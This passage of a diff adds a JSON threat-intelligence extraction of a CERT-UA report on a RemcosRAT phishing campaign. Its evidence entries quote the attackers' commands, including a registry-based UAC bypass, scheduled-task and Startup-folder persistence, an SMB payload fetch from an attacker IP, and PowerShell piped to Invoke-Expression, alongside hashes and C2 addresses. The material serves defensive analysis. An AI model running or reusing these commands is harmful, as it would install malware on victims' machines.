+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_schtasks.exe",
+      "type": "File",
+      "name": "schtasks.exe",
+      "normalized_name": "schtasks.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_20"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "schtasks.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_20",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "WINDIR",
+        "HKCU",
+        "ADMINI",
+        "APPDATA"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_Subscriber_Debt.doc",
+      "type": "File",
+      "name": "Subscriber Debt.doc",
+      "normalized_name": "Subscriber Debt.doc",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_11",
+        "ev_3"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "Subscriber Debt.doc",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_11",
+      "supporting_evidence_ids": [
+        "ev_3"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "ZIP-",
+        "RAR-"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_subscriber.rar",
+      "type": "File",
+      "name": "subscriber.rar",
+      "normalized_name": "subscriber.rar",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "subscriber.rar",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_subscriber.zip",
+      "type": "File",
+      "name": "subscriber.zip",
+      "normalized_name": "subscriber.zip",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "subscriber.zip",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_test2.exe",
+      "type": "File",
+      "name": "test2.exe",
+      "normalized_name": "test2.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_14",
+        "ev_20",
+        "ev_21",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "test2.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_20",
+      "supporting_evidence_ids": [
+        "ev_21",
+        "ev_14",
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "WINDIR",
+        "HKCU",
+        "ADMINI",
+        "APPDATA"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_wscript.exe",
+      "type": "File",
+      "name": "wscript.exe",
+      "normalized_name": "wscript.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_21"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "wscript.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_21",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "LOCALAPPDATA",
+        "TEMP",
+        "NULL"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_wsuscr.exe",
+      "type": "File",
+      "name": "wsuscr.exe",
+      "normalized_name": "wsuscr.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_12",
+        "ev_19",
+        "ev_20",
+        "ev_5"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "file_name": "wsuscr.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_12",
+      "supporting_evidence_ids": [
+        "ev_19",
+        "ev_20",
+        "ev_5"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "BATCH",
+        "WINDIR",
+        "HKCU",
+        "ADMINI"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_test2.bat",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "type": "File",
+      "name": "test2.bat",
+      "normalized_name": "test2.bat",
+      "aliases": [],
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_20"
+      ],
+      "sources": [
+        "event_derive"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact",
+      "file_name": "test2.bat",
+      "file_role": "file_artifact"
+    },
+    {
+      "id": "ent_file_res.bat",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "type": "File",
+      "name": "res.bat",
+      "normalized_name": "res.bat",
+      "aliases": [],
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_20"
+      ],
+      "sources": [
+        "event_derive"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact",
+      "file_name": "res.bat",
+      "file_role": "file_artifact"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_JokerDPR",
+      "tail_id": "ent_threatactor_UAC-0177",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_10"
+      ],
+      "primary_evidence_id": "ev_10",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "type": "executes",
+      "head_id": "ent_file_GB.exe",
+      "tail_id": "ent_file_explorer.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_4",
+        "ev_12"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "type": "executes",
+      "head_id": "ent_file_reg.exe",
+      "tail_id": "ent_file_test2.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_20"
+      ],
+      "primary_evidence_id": "ev_20",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0004",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "type": "loads",
+      "head_id": "ent_file_GB.exe",
+      "tail_id": "ent_file_explorer.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_4",
+        "ev_12"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_file_chain",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0005",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "type": "loads",
+      "head_id": "ent_file_reg.exe",
+      "tail_id": "ent_file_test2.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_20"
+      ],
+      "primary_evidence_id": "ev_20",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_file_chain",
+        "schema_version": "v5.0-event-frame"
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "execution",
+      "relation_id": "rel_0002",
+      "type": "executes",
+      "summary": "GB.exe executes explorer.exe",
+      "evidence_ids": [
+        "ev_4",
+        "ev_12"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "execution",
+      "relation_id": "rel_0003",
+      "type": "executes",
+      "summary": "reg.exe executes test2.exe",
+      "evidence_ids": [
+        "ev_20"
+      ]
+    },
+    {
+      "step_id": "step_003",
+      "stage": "execution",
+      "relation_id": "rel_0004",
+      "type": "loads",
+      "summary": "GB.exe loads explorer.exe",
+      "evidence_ids": [
+        "ev_4",
+        "ev_12"
+      ]
+    },
+    {
+      "step_id": "step_004",
+      "stage": "execution",
+      "relation_id": "rel_0005",
+      "type": "loads",
+      "summary": "reg.exe loads test2.exe",
+      "evidence_ids": [
+        "ev_20"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_1",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s1"
+      },
+      "text": "CERT-UA general information On 21.12.2023, the Government Computer Emergency Response Team of Ukraine CERT- UA recorded a mass distribution of e-mails with the subject \"Debts under the Kyivstar contract\" and an attachment in the form of an archive \"Subscriber's debt.zip\".",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_2",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s2"
+      },
+      "text": "The specified ZIP-archive contains the RAR-archive \"Subscriber's debt.rar\" divided into 2 parts, in which there is a password-protected archive of the same name.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_3",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s3"
+      },
+      "text": "In the latter, there is a document with the macro \"Subscriber Debt.doc\".",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s4"
+      },
+      "text": "If activated, the macro code will download to the PC and launch the \"GB.exe\" file using the file explorer (explorer.exe) using the SMB protocol.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_5",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s5"
+      },
+      "text": "In turn, the specified file is an SFX archive containing a BATCH script for downloading from the bitbucket service and launching the executable file \"wsuscr.exe\", obfuscated with the help of SmartAssembly .NET, the purpose of which is to decrypt and launch the RemcosRAT remote control program (identifier license: 5639D40461DCDD07011A2B87AD3C9EDD).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_6",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s6"
+      },
+      "text": "In addition, letters with the subject \"SBU request\" and an attachment in the form of a \"Documents.zip\" archive containing a password-protected and divided into 3 RAR-archives \"Request.rar\" were recorded.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_7",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s7"
+      },
+      "text": "In the latter, the executable file \"Request.exe\" is located.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_8",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s1"
+      },
+      "text": "4754f0ede14f1bae26b69bd43c7b6705 8b48c11a538af362b766d8ccb09ef11ad6ee62bb430424c9f78d8e7cd5785b7a Debt of the subscriber.zip fb9ce204ff2b2f8014a547a2de568327 ca9093b05cf9e02e06f58c9819042b36b29b8461b4e8f6280bb74a76dcf3e449 Subscriber's debt.part1.rar fc196e76dee54125e5fc15018d764fcf 9f63016c2b9c83da3dca2173ca5f443d7e0e5289983c441fe064766f2da3a2ba Subscriber's debt.part2.rar 324afa8304dc6a079e8f9a2f2ea9654f 1173c9fc2e4fd5eba9ca7492902f860d6b5aac65f1c5d1415aa2cb86f260b94a Automatic access code.txt 1d1d06ebd13ed9a3ea9254962a4c189f 823a799018d1ab0c2eb4c2b26d3f2eb0342fbc30eac34379903398c97d350827 Debt of the subscriber.rar de2e053acae98adbecc23ab3c0e9cf5d 93aa6fc207df430a6e9833259e618895bcdb75c7db0850599d3dbb87d47a54c7 Debt of the subscriber.doc c3e7cfa2e076c3ca421ddc00496c71b5 d698994e527111a6ddd590e09ddf08322d54b82302e881f5f27e3f5d5368829c GB.exe 6c704bae1033920b576dacbcff6bfef5 7c3476fd586bcb7f42e706f32999356fb4b2c8341f00b8297cf74131f6fa611c test2.exe 628ef6dc40f8b6e89b6d537463add174 8272c8939a325be870bcde372842b808a015d2b892e239e16a6211a5c0b4c789 test2.bat fc99e0883a1fa153693547953a83674e 6619b7126840529091b2da2fa1b7238d6b10bc17bbfc8327aad3683ae686b81d wsuscr.exe 490a5462fc6e4f47781",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_9",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s1"
+      },
+      "text": "6041845b2fe9dfb4b06fed8ec8a05295 9277d96732034e91501a8ef9be26a05c63db0be38b50e1d11d4ee3a38929ec2e Emperor 53b204f96e93b70a528b88bedfd6b794 8e0967dbee0583704b4b9718521b04e53edc84ddc61456e6d9e38c5522c9cb46 Compound Bathrooms x 848164d084384c49937f99d5b894253e f58d3a4b2f3f7f10815c24586fae91964eeed830369e7e0701b43895b0cefbd3 VideoMagic.pif ce460418bab48b1e78b3bf611aa34f99 d28975157f2af26766fcbdab8ca5a68bd5bbf1331cef1107424d0400b400ed50 remcos.exe",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_10",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s1"
+      },
+      "text": "Previous Modus operandi UAC-0177 (JokerDPR) on the example of one of the cyber attacks (CERT- UA#8290) The next one APT28: From initial attack to creating threats to a domain controller in an hour (CERT- UA#8399)",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_11",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r1"
+      },
+      "text": "The specified ZIP-archive contains the RAR-archive \"Subscriber's debt.rar\" divided into 2 parts, in which there is a password-protected archive of the same name. In the latter, there is a document with the macro \"Subscriber Debt.doc\".",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_12",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r2"
+      },
+      "text": "If activated, the macro code will download to the PC and launch the \"GB.exe\" file using the file explorer (explorer.exe) using the SMB protocol. In turn, the specified file is an SFX archive containing a BATCH script for downloading from the bitbucket service and launching the executable file \"wsuscr.exe\", obfuscated with the help of SmartAssembly .NET, the purpose of which is to decrypt and launch the RemcosRAT remote control program (identifier license: 5639D40461DCDD07011A2B87AD3C9EDD).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_13",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r3"
+      },
+      "text": "In addition, letters with the subject \"SBU request\" and an attachment in the form of a \"Documents.zip\" archive containing a password-protected and divided into 3 RAR-archives \"Request.rar\" were recorded. In the latter, the executable file \"Request.exe\" is located. If such an archive is opened and the executable files run, the computer may be infected with the RemcosRAT program (License ID: 5639D40461DCDD07011A2B87AD3C9EDD).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_14",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r1"
+      },
+      "text": "4754f0ede14f1bae26b69bd43c7b6705 8b48c11a538af362b766d8ccb09ef11ad6ee62bb430424c9f78d8e7cd5785b7a Debt of the subscriber.zip fb9ce204ff2b2f8014a547a2de568327 ca9093b05cf9e02e06f58c9819042b36b29b8461b4e8f6280bb74a76dcf3e449 Subscriber's debt.part1.rar fc196e76dee54125e5fc15018d764fcf 9f63016c2b9c83da3dca2173ca5f443d7e0e5289983c441fe064766f2da3a2ba Subscriber's debt.part2.rar 324afa8304dc6a079e8f9a2f2ea9654f 1173c9fc2e4fd5eba9ca7492902f860d6b5aac65f1c5d1415aa2cb86f260b94a Automatic access code.txt 1d1d06ebd13ed9a3ea9254962a4c189f 823a799018d1ab0c2eb4c2b26d3f2eb0342fbc30eac34379903398c97d350827 Debt of the subscriber.rar de2e053acae98adbecc23ab3c0e9cf5d 93aa6fc207df430a6e9833259e618895bcdb75c7db0850599d3dbb87d47a54c7 Debt of the subscriber.doc c3e7cfa2e076c3ca421ddc00496c71b5 d698994e527111a6ddd590e09ddf08322d54b82302e881f5f27e3f5d5368829c GB.exe 6c704bae1033920b576dacbcff6bfef5 7c3476fd586bcb7f42e706f32999356fb4b2c8341f00b8297cf74131f6fa611c test2.exe 628ef6dc40f8b6e89b6d537463add174 8272c8939a325be870bcde372842b808a015d2b892e239e16a6211a5c0b4c789 test2.bat fc99e0883a1fa153693547953a83674e 6619b7126840529091b2da2fa1b7238d6b10bc17bbfc8327aad3683ae686b81d wsuscr.exe 490a5462fc6e4f47781",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_15",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r2"
+      },
+      "text": "62f588d655331f053795087b657743fe 9666d03d9770f87436114fc726790b53b8b625bb9cf36902d040afcef6080dce Documents.zip 1ac510cf6c0d34f5148e3136494a2366 1279c4f75e61a2213f9bcb7a14922f9c282d7a647fd4b058ad27c84d7a0f315d Request.part1.rar 57ea2a297e1881d1015634c3e9b7c66d 7a100ddd648c57fd4cf4ef12692380deff557c6630a7c9b2d740f69d5c1941a3 Request.part2.rar f677caecda3825f2553c0e0dcdf3c1b8 eeed029e8b392301e8f4d17492f2de3640925bfe785a0bf784141c384808a1fb Request.part3.rar d4f5c321818c7876c6fffffe3e1fc30e 76f1c40c7ff5dda070703cc4f07a5f5d3489fcfa65884ad91fb33a74303ebd43 Code 275376.txt 75bc7617d832a378a533d896223587bc d59b1ace28e0b35a0bd54fa0ca95f92082b17fa4109fb3f3d0be33ca60834660 Request.exe 0bff5c030f8c781c604fb589c6bfc5a6 be878c37bfab2d6ea7b460d74312523317e3377927222f87aa3ce92f6ebc5bcd Worm 0e38564d3cff4859e4418ff3b1c57506 096a62c27bc5a7c860f72927a5435c8a874044d2412be549817a8f7d13ba93cd Ties 4febae6a56361fa83265fa07f50a1880 0d43898207e1c83da0844e5511a58ea051f4672f0c96a77a8437b326ce9b4547 Stylish participants e0f074f4d3dcd3b2b59c0c162d83ff57 52a25828f2df09476ac25ab2fd12a9b7b47be2a2ef42f58641a4dd1e0dab2aaa Ka aae9e3b0ccd99846c3c5606a3164b3bf d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_16",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r1"
+      },
+      "text": "6041845b2fe9dfb4b06fed8ec8a05295 9277d96732034e91501a8ef9be26a05c63db0be38b50e1d11d4ee3a38929ec2e Emperor 53b204f96e93b70a528b88bedfd6b794 8e0967dbee0583704b4b9718521b04e53edc84ddc61456e6d9e38c5522c9cb46 Compound Bathrooms x 848164d084384c49937f99d5b894253e f58d3a4b2f3f7f10815c24586fae91964eeed830369e7e0701b43895b0cefbd3 VideoMagic.pif ce460418bab48b1e78b3bf611aa34f99 d28975157f2af26766fcbdab8ca5a68bd5bbf1331cef1107424d0400b400ed50 remcos.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_17",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r1"
+      },
+      "text": "\\\\89[.]23.98.22\\LN\\ \\\\89[.]23.98.22\\LN\\GB.exe (tcp)://45[.]87.155.41:8080 (tcp)://45[.]87.155.41:465 (tcp)://45[.]87.155.41:54550 (tcp)://45[.]87.155.41:80 (tcp)://45[.]87.154.153:80 (tcp)://45[.]87.154.153:8080 (tcp)://101[.]99.75.16:80 (tcp)://101[.]99.75.16:8080 (tcp)://101[.]99.75.16:465 (tcp)://101[.]99.75.145:465 (tcp)://101[.]99.75.145:80 (tcp)://94[.]131.102.115:80 (tcp)://94[.]131.102.117:80 (tcp)://94[.]131.102.119:80 (tcp)://94[.]131.102.122:80 (tcp)://94[.]131.102.124:80",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_19",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r3"
+      },
+      "text": "101[.]99.75.14 101[.]99.75.145 101[.]99.75.147 101[.]99.75.16 45[.]87.154.153 45[.]87.155.41 81[.]19.149.130 89[.]23.98.22 94[.]131.102.115 94[.]131.102.117 94[.]131.102.119 94[.]131.102.122 94[.]131.102.124 95[.]164.35.143 95[.]164.35.174 95[.]164.35.234 hXXps://bitbucket[.]org/olegovich-007/777/downloads/wsuscr.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_20",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r1"
+      },
+      "text": "\"%WINDIR%\\System32\\reg.exe\" add HKCU\\Software\\Classes\\ms-settings\\CurVer /d .omg /f \"%WINDIR%\\System32\\reg.exe\" delete HKCU\\Software\\Classes\\.omg\\ /f \"%WINDIR%\\System32\\reg.exe\" delete HKCU\\Software\\Classes\\ms-settings\\ /f \"%WINDIR%\\System32\\reg.exe\" add HKCU\\Software\\Classes\\.omg\\Shell\\Open\\command /d C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\persistent2\\test2.exe /f %APPDATA%\\wsuscr.exe %TEMP%\\IXP000.TMP\\test2.bat %TEMP%\\persistent2\\test2.exe cmd /c \"test2.bat\" cmd /c schtasks.exe /create /tn \"Watson\" /tr \"wscript '%LOCALAPPDATA%\\Insightful Markets Technologies\\MarketWise.js'\" /sc minute /mo 3 /F cmd /k cmd < Bathrooms & exit cmd /k echo [InternetShortcut] > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MarketWise.url\" & echo URL=\"%LOCALAPPDATA%\\Insightful Markets Technologies\\MarketWise.js\" >> \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MarketWise.url\" & exit cmd.exe \"%LOCALAPPDATA%\\Insightful Markets Technologies\\MarketWise.pif\" \"%LOCALAPPDATA%\\Insightful Markets Technologies\\A cmd.exe /S /D /c\" echo F \" cmd.exe /c res.bat && test2.exe dvwsus-SFNWWW exel-3RO5G3 explorer.exe \"\\\\89.23.98.22\\LN\\\" powershell -Command \" [System.Text.Encoding]::Unicode.GetString([S",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_21",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r2"
+      },
+      "text": "| Invoke-Expression\" powershell.exe -Command Stop-Process -Name explorer wscript \"%LOCALAPPDATA%\\Insightful Markets Technologies\\MarketWise.js\" wscript.exe \"%LOCALAPPDATA%\\Insightful Markets Technologies\\MarketWise.js\" xcopy /s test2.exe \"%TEMP%\\persistent2\\test2.exe\" >NULL",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_22",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb22"
+      },
+      "text": "a18876e286ea71d6d0098f6daa61a456fe1a2c176ab025668bbe5d64feafb829 remcos.exe",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_23",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb23"
+      },
+      "text": "ad3683ae686b81d wsuscr.exe 490a5462fc6e4f477811ee08a00c7c85 a18876e286ea71d6d0098f6daa61a456fe1a2c176ab025668bbe5d64feafb829 remcos.exe 62f588d655331f053795087b657743fe 9666d03d977",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_24",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb24"
+      },
+      "text": "d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a7ce3b52 Injection",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_25",
+      "evidence_type": "report_text",
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb25"
+      },
+      "text": "f42f58641a4dd1e0dab2aaa Ka aae9e3b0ccd99846c3c5606a3164b3bf d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a7ce3b52 Injection",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
